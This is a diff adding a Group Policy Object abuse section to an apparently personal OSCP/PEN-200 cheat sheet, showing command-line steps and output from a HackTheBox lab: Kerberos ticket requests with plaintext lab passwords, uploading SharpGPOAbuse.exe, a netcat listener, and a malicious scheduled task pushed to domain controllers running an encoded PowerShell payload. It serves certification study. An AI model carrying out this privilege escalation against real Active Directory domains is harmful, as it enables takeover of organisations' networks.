@@ -6,7 +6,6 @@ disqus: hackmd
 [OSCP, PEN-200] Cheat Sheet
 ===
 
-
 # Recon
 ## IP
 ### Nmap
@@ -303,6 +302,75 @@ Mode                 LastWriteTime         Length Name
 - Kerberos
     - `impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip 10.10.11.60`
     - [*] Saving ticket in f.frizzle.ccache
+
+## Group Policy Object (GPO) Abuse
+- Group Policy Creator Owners
+
+```
+PS C:\Users\M.SchoolBus\Desktop> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                   Type             SID                                            Attributes                             
+                        
+============================================ ================ ============================================== ===============================================================
+...
+frizz\Group Policy Creator Owners            Group            S-1-5-21-2386970044-1145388522-2932701813-520  Mandatory group, Enabled by default, Enabled group
+
+PS C:\Users\M.SchoolBus\Desktop> New-GPO -Name chw | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes    
+
+GpoId       : 0329b9b2-02c7-4796-a039-fb5123d758fb
+DisplayName : chw
+Enabled     : True
+Enforced    : False
+Target      : OU=Domain Controllers,DC=frizz,DC=htb
+Order       : 3
+```
+![image](https://hackmd.io/_uploads/H197rJitlx.png)
+(Kali 匯入 SharpGPOAbuse.exe)
+```
+┌──(chw㉿CHW)-[~/Desktop/upload_tools]
+└─$ sudo ntpdate -u 10.10.11.60                                        
+┌──(chw㉿CHW)-[~/Desktop/upload_tools]
+└─$ impacket-getTGT frizz.htb/M.SchoolBus:'!suBcig@MehTed!R' -dc-ip 10.10.11.60
+...
+[*] Saving ticket in M.SchoolBus.ccache                                                        
+┌──(chw㉿CHW)-[~/Desktop/upload_tools]
+└─$ export KRB5CCNAME=M.SchoolBus.ccache                       
+┌──(chw㉿CHW)-[~/Desktop/upload_tools]
+└─$ KRB5CCNAME=M.SchoolBus.ccache \
+scp -P 22 -o GSSAPIAuthentication=yes -o PreferredAuthentications=gssapi-with-mic \
+  ./SharpGPOAbuse.exe m.schoolbus@frizz.htb:"C:/Users/m.schoolbus/Desktop/"
+SharpGPOAbuse.exe                                                                                                 100%   79KB  70.3KB/s   00:01    
+
+┌──(chw㉿CHW)-[~/Desktop/upload_tools]
+└─$ nc -lvnp 8888               
+listening on [any] 8888 ...
+
+```
+```
+PS C:\Users\M.SchoolBus\Desktop> .\SharpGPOAbuse.exe --addcomputertask --gponame "chw" --author TCG --taskname PrivEsc --command "powershell.exe" --arguments "powershell -e ...=="
+[+] Domain = frizz.htb
+[+] Domain Controller = frizzdc.frizz.htb
+[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
+[+] GUID of "chw" is: {BC54F62C-D0BC-4C50-AFD7-43E0ACE49DA2}
+[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{BC54F62C-D0BC-4C50-AFD7-43E0ACE49DA2}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
+[+] Done!
+
+PS C:\Users\M.SchoolBus\Desktop> gpupdate /force
+Updating policy...
+
+Computer Policy update has completed successfully.
+User Policy update has completed successfully.
+```
+
+
+
+
 
 # Vuln
 ### WPscan
